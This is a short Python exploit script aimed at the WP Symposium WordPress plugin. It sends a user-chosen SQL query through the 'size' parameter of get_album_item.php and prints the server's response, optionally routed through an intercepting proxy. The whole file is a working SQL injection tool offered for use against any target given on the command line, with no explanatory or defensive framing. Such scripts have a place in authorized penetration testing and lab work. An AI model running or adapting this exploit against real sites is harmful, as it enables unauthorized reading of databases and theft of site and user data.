#!/usr/bin/python3
# coding: utf-8

import argparse
import requests

def main(args):

    target = f"http://{args.target}"
    path = f"/wp-content/plugins/wp-symposium/get_album_item.php"
    #query_string = f"size={args.query} ; --"
    query_string = f"size=({args.query}); --"  # More comfortable for advanced queries
    url = f"{target}/{path}?{query_string}"
    proxy = {"http": args.proxy}

    response = requests.get(url, proxies=proxy)
    if args.verbose > 0:
        print(f"Response code: {response.status_code}")
    print(response.text)


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('target', type=str, help="Target IP/URL")
    parser.add_argument('-c', '--query', type=str, help="Query to inject")
    parser.add_argument('-x', '--proxy', type=str, help="HTTP intercepting proxy")
    parser.add_argument('-v', '--verbose', action='count', default=0, help="Verbose mode")
    args = parser.parse_args()
    main(args)
